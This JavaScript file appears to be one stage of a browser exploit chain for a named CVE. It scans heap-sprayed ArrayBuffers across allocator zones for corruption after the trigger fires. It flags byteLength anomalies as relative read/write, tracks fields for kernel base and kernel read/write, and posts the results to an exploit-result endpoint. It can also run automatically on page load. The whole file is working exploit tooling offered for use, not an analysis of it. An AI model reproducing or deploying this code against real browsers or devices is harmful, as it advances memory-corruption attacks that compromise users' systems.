/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 6 post-trigger corruption scan.
 * Scans surviving ArrayBuffer sprays across all bmalloc zones for length anomalies,
 * byte corruption, reallocated zeros, or detached buffer exceptions.
 * Reports /api/glyphgrift-exploit-result. Never sets krw_ready without a real leak.
 */
(function () {
  'use strict';

  var API = '/api/glyphgrift-exploit-result';

  function expectedByte(marker, i) {
    return (marker + i) & 0xff;
  }

  function scanSpray() {
    var sprays = window.__L0FCK_GLYPHGRIFT_SPRAYS;
    var single = window.__L0FCK_GLYPHGRIFT_SPRAY;
    var currentRound = window.__L0FCK_GLYPHGRIFT_ROUND || 0;

    var result = {
      corruption_detected: false,
      corrupted_buffer_index: -1,
      corrupted_offset: 0,
      corrupted_value: 0,
      corrupted_zone: 0,
      relative_rw_achieved: false,
      leaked_ptr: 0,
      kbase: 0,
      krw_ready: false,
      total_scanned: 0,
      zones_scanned: 0,
      round: currentRound,
      error_message: ''
    };

    if (!sprays && (!single || !single.length)) {
      result.error_message = 'no spray references';
      return result;
    }

    /* Wrap fallback single spray into dictionary if multi-zone object is missing */
    if (!sprays && single) {
      sprays = {};
      var singleZone = window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE || 128;
      sprays[singleZone] = single;
    }

    var zoneKeys = Object.keys(sprays);
    result.zones_scanned = zoneKeys.length;

    for (var z = 0; z < zoneKeys.length; z++) {
      var zoneSizeStr = zoneKeys[z];
      var zoneSize = parseInt(zoneSizeStr, 10) || 128;
      var arr = sprays[zoneSizeStr];
      if (!arr || !arr.length) continue;

      var expectedLen = Math.max(16, zoneSize - 16);

      for (var i = 0; i < arr.length; i++) {
        if (!arr[i]) continue;
        var buf = arr[i];
        result.total_scanned++;

        var len;
        try {
          len = buf.byteLength;
        } catch (lenErr) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.error_message = 'byteLength property access threw in zone ' + zoneSize;
          return result;
        }

        if (typeof len !== 'number' || len <= 0) continue;

        /* Check 1: byteLength anomaly (metadata corruption -> relative R/W) */
        if (len !== expectedLen) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.corrupted_offset = 0;
          result.corrupted_value = len & 0xffff;
          result.relative_rw_achieved = true;
          result.krw_ready = false;
          result.kbase = 0;
          result.leaked_ptr = 0;
          result.error_message = 'byteLength anomaly in zone ' + zoneSize + ': ' + expectedLen + ' -> ' + len;
          return result;
        }

        /* Check 2 & 3: buffer content anomaly or detached exception */
        try {
          var u8 = new Uint8Array(buf);
          var marker = ((currentRound * 0x20) + (z * 0x10) + (i & 0x0f)) & 0xff;
          var anomalies = 0;
          var allZero = true;
          var firstBadOff = -1;
          var badVal = 0;

          for (var off = 0; off < u8.length; off++) {
            var val = u8[off];
            if (val !== 0) allZero = false;
            var exp = expectedByte(marker, off);
            if (val !== exp) {
              anomalies++;
              if (firstBadOff < 0) {
                firstBadOff = off;
                badVal = val | ((off + 1 < u8.length ? u8[off + 1] : 0) << 8);
              }
            }
          }

          if (allZero && expectedLen > 0) {
            result.corruption_detected = true;
            result.corrupted_buffer_index = i;
            result.corrupted_zone = zoneSize;
            result.corrupted_offset = 0;
            result.corrupted_value = 0;
            result.relative_rw_achieved = false;
            result.error_message = 'backing store reallocated (all zeros) in zone ' + zoneSize;
            return result;
          }

          if (anomalies > 0) {
            result.corruption_detected = true;
            result.corrupted_buffer_index = i;
            result.corrupted_zone = zoneSize;
            result.corrupted_offset = firstBadOff;
            result.corrupted_value = badVal;
            result.relative_rw_achieved = false;
            result.krw_ready = false;
            result.kbase = 0;
            result.leaked_ptr = 0;
            result.error_message = 'content anomaly (' + anomalies + ' bytes) in zone ' + zoneSize + ' offset ' + firstBadOff;
            return result;
          }
        } catch (e) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.error_message = 'buffer access exception (detached): ' + String(e && e.message ? e.message : e);
          return result;
        }
      }
    }

    if (!result.corruption_detected) {
      result.error_message = 'no corruption observed in spray (' + result.total_scanned + ' buffers in ' + result.zones_scanned + ' zones)';
    }
    return result;
  }

  function postResult(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx) {
    if (ctx && ctx.log) ctx.log('glyphgrift post-trigger scan');
    var payload = scanSpray();
    return postResult(payload).then(function () {
      if (ctx && ctx.report) {
        var st = payload.corruption_detected ? 'corruption' : 'clean';
        return ctx.report('glyphgrift_post_trigger', st, JSON.stringify(payload));
      }
      return payload;
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_post_trigger = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_POST_TRIGGER = function () {
    return execute(null);
  };

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_POST === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();

